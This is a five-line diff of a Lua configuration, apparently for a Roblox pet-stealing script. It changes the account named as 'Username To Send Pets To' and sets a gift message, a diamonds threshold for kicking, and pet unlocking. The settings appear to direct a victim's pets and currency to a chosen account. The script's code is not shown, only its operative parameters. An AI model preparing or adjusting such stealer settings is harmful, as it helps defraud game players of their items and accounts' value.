@@ -1,5 +1,5 @@
 --[[ Main Config ]]--
-_G.Username = "HerrySzymoN" --// Username To Send Pets To
+_G.Username = "TestowanieSkrypta" --// Username To Send Pets To
 _G.GiftMessage = "SimonHub" --// Message For The Gift To Say
 _G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
 _G.UnlockPets = true --// Unlocks Locked Pets
